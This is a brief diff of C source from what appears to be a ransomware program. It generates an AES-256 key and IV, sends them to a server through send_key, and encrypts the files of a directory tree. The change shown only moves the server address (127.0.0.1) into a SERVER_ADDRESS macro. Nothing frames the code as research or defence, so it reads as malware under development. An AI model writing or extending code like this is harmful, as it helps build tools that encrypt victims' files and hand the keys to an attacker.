@@ -5,6 +5,8 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 
+#define SERVER_ADDRESS "127.0.0.1"
+
 void usage();
 
 int is_encrypted(char *file)
@@ -127,7 +129,7 @@ int main(int argc, char *argv[])
 
 			generate_key(key, AES_256_KEY_SIZE, iv, AES_BLOCK_SIZE, pKey, pIv);
 
-			send_key(pKey, pIv, "127.0.0.1");
+			send_key(pKey, pIv, SERVER_ADDRESS);
 
 			listdir(argv[2], iv, key, 'e');
 
